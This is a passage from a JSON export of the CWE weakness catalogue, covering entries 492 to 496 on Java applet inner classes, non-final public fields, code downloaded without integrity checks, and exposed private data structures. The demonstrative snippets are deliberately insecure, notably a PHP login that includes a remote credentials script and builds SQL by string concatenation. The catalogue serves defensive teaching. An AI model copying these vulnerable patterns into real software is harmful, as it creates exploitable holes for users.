              "ExampleCode": "```\n\tpublic class UrlToolApplet extends Applet {\n```\n// private member variables for applet components* \n\t\t\tprivate Label enterUrlLabel;\n\t\t\tprivate TextField enterUrlTextField;\n\t\t\tprivate Button submitButton;\n\t\t\t\n\t\t\t\n\t\t\t *// init method that adds components to applet* \n\t\t\t\n\t\t\t\n\t\t\t *// and creates button listener object* \n\t\t\tpublic void init() {\n\t\t\t```\n\t\t\t\tsetLayout(new FlowLayout());\n\t\t\t\tenterUrlLabel = new Label(\"Enter URL: \");\n\t\t\t\tenterUrlTextField = new TextField(\"\", 20);\n\t\t\t\tsubmitButton = new Button(\"Submit\");\n\t\t\t\tadd(enterUrlLabel);\n\t\t\t\tadd(enterUrlTextField);\n\t\t\t\tadd(submitButton);\n\t\t\t\tActionListener submitButtonListener = new SubmitButtonListener();\n\t\t\t\tsubmitButton.addActionListener(submitButtonListener);\n\t\t\t}\n```\n// button listener inner class for UrlToolApplet class* \n\t\t\tprivate class SubmitButtonListener implements ActionListener {\n\t\t\t```\n\t\t\t\t\tpublic void actionPerformed(ActionEvent evt) {\n\t\t\t\t\t\t\tif (evt.getSource() == submitButton) {\n\t\t\t\t\t\t\t\tString urlString = enterUrlTextField.getText();\n\t\t\t\t\t\t\t\tURL url = null;\n\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\turl = new URL(urlString);\n\t\t\t\t\t\t\t\t} catch (MalformedURLException e) {\n\t\t\t\t\t\t\t\t\tSystem.err.println(\"Malformed URL: \" + urlString);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif (url != null) {\n\t\t\t\t\t\t\t\t\tgetAppletContext().showDocument(url);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "As with the previous examples a solution to this problem would be to use a static inner class, a local inner class or an anonymous inner class. An alternative solution would be to have the applet implement the action listener rather than using it as an inner class as shown in the following example."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class UrlToolApplet extends Applet implements ActionListener {\n```\n// private member variables for applet components* \n\t\t\tprivate Label enterUrlLabel;\n\t\t\tprivate TextField enterUrlTextField;\n\t\t\tprivate Button submitButton;\n\t\t\t\n\t\t\t\n\t\t\t *// init method that adds components to applet* \n\t\t\tpublic void init() {\n\t\t\t```\n\t\t\t\tsetLayout(new FlowLayout());\n\t\t\t\tenterUrlLabel = new Label(\"Enter URL: \");\n\t\t\t\tenterUrlTextField = new TextField(\"\", 20);\n\t\t\t\tsubmitButton = new Button(\"Submit\");\n\t\t\t\tadd(enterUrlLabel);\n\t\t\t\tadd(enterUrlTextField);\n\t\t\t\tadd(submitButton);\n\t\t\t\tsubmitButton.addActionListener(this);\n\t\t\t}\n```\n// implementation of actionPerformed method of ActionListener interface* \n\t\t\tpublic void actionPerformed(ActionEvent evt) {\n\t\t\t```\n\t\t\t\t\tif (evt.getSource() == submitButton) {\n\t\t\t\t\t\tString urlString = enterUrlTextField.getText();\n\t\t\t\t\t\tURL url = null;\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\turl = new URL(urlString);\n\t\t\t\t\t\t} catch (MalformedURLException e) {\n\t\t\t\t\t\t\tSystem.err.println(\"Malformed URL: \" + urlString);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (url != null) {\n\t\t\t\t\t\t\tgetAppletContext().showDocument(url);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Mobile Code: Use of Inner Class"
        },
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Publicizing of private data when using inner classes"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "OBJ08-J",
          "EntryName": "Do not expose private members of an outer class from within a nested class"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Other",
          "Note": "Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running."
        }
      ]
    },
    {
      "ID": "493",
      "Name": "Critical Public Variable Without Final Modifier",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product has a critical public variable that is not final, which allows the variable to be modified to contain unexpected values.",
      "ExtendedDescription": "If a field is non-final and public, it can be changed once the value is set by any function that has access to the class which contains the field. This could lead to a vulnerability if other parts of the program make assumptions about the contents of that field.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
        "Mobile code, such as a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.",
        "Final provides security by only allowing non-mutable objects to be changed after being set. However, only objects which are not extended can be made final."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "The object could potentially be tampered with."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "The object could potentially allow the object to be read."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Declare all public fields as final when possible, especially if it is used to maintain internal state of an Applet or of classes used by an Applet. If a field must be public, then perform all appropriate sanity checks before accessing the field from your code."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Suppose this WidgetData class is used for an e-commerce web site. The programmer attempts to prevent price-tampering attacks by setting the price of the widget using the constructor."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic final class WidgetData extends Applet {\n\t\tpublic float price;\n\t\t...\n\t\tpublic WidgetData(...) {\n\t\t\tthis.price = LookupPrice(\"MyWidgetType\");\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The price field is not final. Even though the value is set by the constructor, it could be modified by anybody that has access to an instance of WidgetData."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "Assume the following code is intended to provide the location of a configuration file that controls execution of the application."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tpublic string configPath = \"/etc/application/config.dat\";\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic String configPath = new String(\"/etc/application/config.dat\");\n```"
            },
            {
              "BodyText": "While this field is readable from any function, and thus might allow an information leak of a pathname, a more serious problem is that it can be changed by any function."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Mobile Code: Non-Final Public Field"
        },
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Failure to provide confidentiality for stored data"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "OBJ10-J",
          "EntryName": "Do not use public static nonfinal variables"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "494",
      "Name": "Download of Code Without Integrity Check",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.",
      "ExtendedDescription": "An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "345",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "669",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "669",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Availability",
            "Confidentiality",
            "Other"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Alter Execution Logic",
            "Other"
          ],
          "Note": "Executing untrusted code could compromise the control flow of the program. The untrusted code could execute attacker-controlled commands, read or modify sensitive resources, or prevent the software from functioning correctly for legitimate users."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-7.4",
          "Method": "Manual Analysis",
          "Description": "\n\nThis weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.\n\n\nSpecifically, manual static analysis is typically required to find the behavior that triggers the download of code, and to determine whether integrity-checking methods are in use.\n",
          "EffectivenessNotes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
        },
        {
          "DetectionMethodID": "DM-11",
          "Method": "Black Box",
          "Description": "\n\nUse monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.\n\n\nAttach the monitor to the process and also sniff the network connection. Trigger features related to product updates or plugin installation, which is likely to force a code download. Monitor when files are downloaded and separately executed, or if they are otherwise read back into the process. Look for evidence of cryptographic library calls that use integrity checking.\n"
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-42",
          "Phase": [
            "Implementation"
          ],
          "Description": "Perform proper forward and reverse DNS lookups to detect DNS spoofing.",
          "EffectivenessNotes": "This is only a partial solution since it will not prevent your code from being modified on the hosting site or in transit."
        },
        {
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Description": "\n\nEncrypt the code with a reliable encryption scheme before transmitting.\n\n\nThis will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site.\n"
        },
        {
          "MitigationID": "MIT-4",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nSpeficially, it may be helpful to use tools or frameworks to perform integrity checking on the transmitted code.\n\n\n  - When providing the code that is to be downloaded, such as for automatic updates of the software, then use cryptographic signatures for the code and modify the download clients to verify the signatures. Ensure that the implementation does not contain CWE-295, CWE-320, CWE-347, and related weaknesses.\n\n  - Use code signing technologies such as Authenticode. See references [REF-454] [REF-455] [REF-456].\n\n"
        },
        {
          "MitigationID": "MIT-17",
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."
        },
        {
          "MitigationID": "MIT-22",
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Sandbox or Jail",
          "Description": "\n\nRun the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.\n\n\nOS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.\n\n\nThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.\n\n\nBe careful to avoid CWE-243 and other weaknesses related to jails.\n",
          "Effectiveness": "Limited",
          "EffectivenessNotes": "The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This example loads an external class from a local subdirectory."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tURL[] classURLs= new URL[]{\n\t\tnew URL(\"file:subdir/\")\n\t};\n\tURLClassLoader loader = new URLClassLoader(classURLs);\n\tClass loadedClass = Class.forName(\"loadMe\", true, loader);\n```"
            },
            {
              "BodyText": "This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class file to execute malicious code."
            }
          ]
        },
        {
          "ID": "DX-219",
          "Entries": [
            {
              "IntroText": "This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n```\n//assume the password is already encrypted, avoiding CWE-312* \n\t\n\tfunction authenticate($username,$password){\n\t```\n\t\tinclude(\"http://external.example.com/dbInfo.php\");\n```\n//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available* \n\t\tmysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');\n\t\tmysql_select_db($dbname);\n\t\t$query = 'Select * from users where username='.$username.' And password='.$password;\n\t\t$result = mysql_query($query);\n\t\t\n\t\tif(mysql_numrows($result) == 1){\n\t\t```\n\t\t\tmysql_close();\n\t\t\treturn true;\n\t\t}\n\t\telse{\n\t\t\tmysql_close();\n\t\t\treturn false;\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow themself to access the application without a real user account."
            },
            {
              "BodyText": "This example is also vulnerable to an Adversary-in-the-Middle AITM (CWE-300) attack."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2019-9534",
          "Description": "Satellite phone does not validate its firmware image.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-9534"
        },
        {
          "Reference": "CVE-2021-22909",
          "Description": "Chain: router's firmware update procedure uses curl with \"-k\" (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-22909"
        },
        {
          "Reference": "CVE-2008-3438",
          "Description": "OS does not verify authenticity of its own updates.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3438"
        },
        {
          "Reference": "CVE-2008-3324",
          "Description": "online poker client does not verify authenticity of its own updates.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3324"
        },
        {
          "Reference": "CVE-2001-1125",
          "Description": "anti-virus product does not verify automatic updates for itself.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1125"
        },
        {
          "Reference": "CVE-2002-0671",
          "Description": "VOIP phone downloads applications from web sites without verifying integrity.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0671"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Invoking untrusted mobile code"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SEC06-J",
          "EntryName": "Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP27",
          "EntryName": "Tainted input to environment"
        }
      ],
      "RelatedAttackPatterns": [
        "184",
        "185",
        "186",
        "187",
        "533",
        "538",
        "657",
        "662",
        "691",
        "692",
        "693",
        "695"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-454",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Introduction to Code Signing",
          "URL": "http://msdn.microsoft.com/en-us/library/ms537361(VS.85).aspx"
        },
        {
          "ExternalReferenceID": "REF-455",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Authenticode",
          "URL": "http://msdn.microsoft.com/en-us/library/ms537359(v=VS.85).aspx"
        },
        {
          "ExternalReferenceID": "REF-456",
          "Authors": [
            "Apple"
          ],
          "Title": "Code Signing Guide",
          "Publication": "Apple Developer Connection",
          "PublicationYear": "2008",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "URL": "https://web.archive.org/web/20080724215143/http://developer.apple.com/documentation/Security/Conceptual/CodeSigningGuide/Introduction/chapter_1_section_1.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-457",
          "Authors": [
            "Anthony Bellissimo",
            "John Burgess",
            "Kevin Fu"
          ],
          "Title": "Secure Software Updates: Disappointments and New Challenges",
          "URL": "http://prisms.cs.umass.edu/~kevinfu/papers/secureupdates-hotsec06.pdf"
        },
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 18: The Sins of Mobile Code.\" Page 267",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        },
        {
          "ExternalReferenceID": "REF-459",
          "Authors": [
            "Johannes Ullrich"
          ],
          "Title": "Top 25 Series - Rank 20 - Download of Code Without Integrity Check",
          "PublicationYear": "2010",
          "PublicationMonth": "04",
          "PublicationDay": "05",
          "Publisher": "SANS Software Security Institute",
          "URL": "https://www.sans.org/blog/top-25-series-rank-20-download-of-code-without-integrity-check/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-76",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Least Privilege",
          "PublicationYear": "2005",
          "PublicationMonth": "09",
          "PublicationDay": "14",
          "URL": "https://web.archive.org/web/20211209014121/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "This is critical for mobile code, but it is likely to become more and more common as developers continue to adopt automated, network-based product distributions and upgrades. Software-as-a-Service (SaaS) might introduce additional subtleties. Common exploitation scenarios may include ad server compromises and bad upgrades."
        }
      ]
    },
    {
      "ID": "495",
      "Name": "Private Data Structure Returned From A Public Method",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product has a method that is declared public, but returns a reference to a private data structure, which could then be modified in unexpected ways.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "The contents of the data structure can be modified from outside the intended scope."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Declare the method private."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Clone the member data and keep an unmodified version of the data private to the object."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use public setter methods that govern how a private member can be modified."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Here, a public method in a Java class returns a reference to a private array. Given that arrays in Java are mutable, any modifications made to the returned reference would be reflected in the original private array."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate String[] colors;\n\tpublic String[] getColors() {\n\t\treturn colors;\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In this example, the Color class defines functions that return non-const references to private members (an array type and an integer type), which are then arbitrarily altered from outside the control of the class."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tclass Color\n\t{\n\t\tprivate:\n\t\t\tint[2] colorArray;\n\t\t\tint colorValue;\n\t\tpublic:\n\t\t\tColor () : colorArray { 1, 2 }, colorValue (3) { };\n\t\t\tint[2] & fa () { return colorArray; } \n```\n// return reference to private array* \n\t\t\tint & fv () { return colorValue; } \n\t\t\t *// return reference to private integer* };\n\t\n\tint main ()\n\t{\n\t```\n\t\tColor c;\n\t\tc.fa () [1] = 42; \n```\n// modifies private array element* \n\t\tc.fv () = 42; \n\t\t *// modifies private int* \n\t\t\n\t\treturn 0;}"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Private Array-Typed Field Returned From A Public Method"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "496",
      "Name": "Public Data Assigned to Private Array-Typed Field",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Assigning public data to a private array is equivalent to giving public access to the array.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "The contents of the array can be modified from outside the intended scope."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Do not allow objects to modify private members of a class."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the example below, the setRoles() method assigns a publically-controllable array to a private field, thus allowing the caller to modify the private array directly by virtue of the fact that arrays in Java are mutable."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate String[] userRoles;\n\tpublic void setUserRoles(String[] userRoles) {\n\t\tthis.userRoles = userRoles;\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Public Data Assigned to Private Array-Typed Field"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP25",
          "EntryName": "Tainted input to variable"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
